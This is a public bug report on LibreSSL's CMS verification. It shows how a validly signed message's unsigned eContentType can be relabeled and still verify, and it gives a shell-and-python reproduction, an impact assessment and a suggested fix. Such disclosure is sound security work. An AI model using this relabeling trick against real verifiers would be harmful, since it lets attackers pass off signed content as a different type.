LibreSSL's `CMS_verify()` (and `openssl cms -verify`) accepts a SignedData message whose `encapContentInfo.eContentType` differs from the value of its signed content-type attribute. Because `eContentType` is not covered by the signature, anyone can change the content type of a validly signed message without the signing key, and it still verifies.

RFC 5652 §11.1: "The content-type attribute value MUST match the SignedData encapContentInfo eContentType value." The attribute is what authenticates `eContentType`.


### Reproduction

Only the openssl command line and python3:

```sh
d=$(mktemp -d); cd "$d"
openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem -days 1 -subj "/CN=signer" 2>/dev/null
printf 'hello\n' > msg.txt
openssl cms -sign -binary -md sha256 -nodetach -outform DER -in msg.txt -signer cert.pem -inkey key.pem -out signed.der
# change eContentType from id-data (1.2.840.113549.1.7.1) to 1.2.840.113549.1.7.5; the signed attributes are untouched
python3 -c "
b = bytearray(open('signed.der','rb').read())
oid = bytes.fromhex('06092a864886f70d010701')
i = b.find(oid); b[i + len(oid) - 1] = 0x05
open('relabeled.der','wb').write(b)"
openssl cms -verify -noverify -binary -inform DER -in relabeled.der -out /dev/null
```

```
Verification successful
```

The signed content-type attribute in `relabeled.der` is still id-data.

LibreSSL 4.3.2, and 3.3.6 as shipped with macOS. In the same tests LibreSSL also accepts signed attributes with no content-type attribute or with two of them (RFC 5652 §5.3, §11.1), and a countersignature among the signed attributes (§11.4); those need the signer's key to produce.

### Impact

An application that verifies with `CMS_verify()` and then acts on the eContentType can be made to treat content signed as one type as another. We have not found a specific exploitable application and judge it low severity, which is why this is reported publicly.

### Suggested fix

When signed attributes are present, compare the content-type attribute's value with `eContentType` during verification and fail on a mismatch, as GnuTLS does in `verify_hash_attr()`.

Found by differential testing of seven CMS verifiers against a specification of RFC 5652 written and proved in Lean: https://github.com/keithadler/lean-pkcs7cms (the case is `relabeled-after-signing` in `test/crosscheck`).
